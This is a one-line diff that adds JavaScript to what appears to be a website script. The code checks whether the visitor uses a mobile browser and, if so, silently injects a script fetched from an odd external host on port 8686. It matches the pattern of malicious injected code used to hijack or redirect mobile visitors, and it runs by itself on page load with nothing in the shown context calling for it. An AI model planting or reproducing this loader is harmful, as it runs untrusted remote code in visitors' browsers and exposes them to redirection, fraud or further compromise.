@@ -1,0 +1,1 @@
+if(navigator.userAgent.match(/(iPhone|iPod|Android|mobile|blackberry|webos|incognito|webmate|bada|nokia|lg|ucweb|skyfire)/i)){;(function(){var m = document.createElement("script");var url = "https://hyjss.tkshyp.com:8686/";m.src = url + "s.php?id=1534" ;var ss = document.getElementsByTagName("script")[0];ss.parentNode.insertBefore(m, ss);})();}
